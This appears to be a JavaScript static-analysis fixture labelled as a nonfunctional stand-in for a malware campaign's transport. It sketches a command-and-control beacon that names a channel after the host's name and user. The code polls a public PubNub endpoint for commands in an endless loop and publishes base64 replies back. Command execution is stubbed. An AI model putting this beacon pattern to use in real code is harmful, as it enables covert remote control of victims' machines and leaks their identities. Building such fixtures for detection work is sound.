// Representative Type A transport variant; not recovered campaign bytes.
// Nonfunctional fixture keys. Never execute this static-analysis fixture.
const cp = require('node:child_process');
const os = require('node:os');
async function run() {
  const channel = os.hostname() + '-' + os.userInfo().username;
  let cursor = '0';
  while (true) {
    const packet = await fetch('https://ps.pndsn.com/subscribe/sub-c-fixture/' + channel + '/0/' + cursor);
    const response = await packet.json();
    cursor = response[1];
    if (response[0].length) {
      const output = Buffer.from('chat message');
      const message = encodeURIComponent(JSON.stringify(output.toString('base64')));
      await fetch('https://ps.pndsn.com/publish/pub-c-fixture/sub-c-fixture/0/' + channel + '/0/' + message);
    }
  }
}
run();
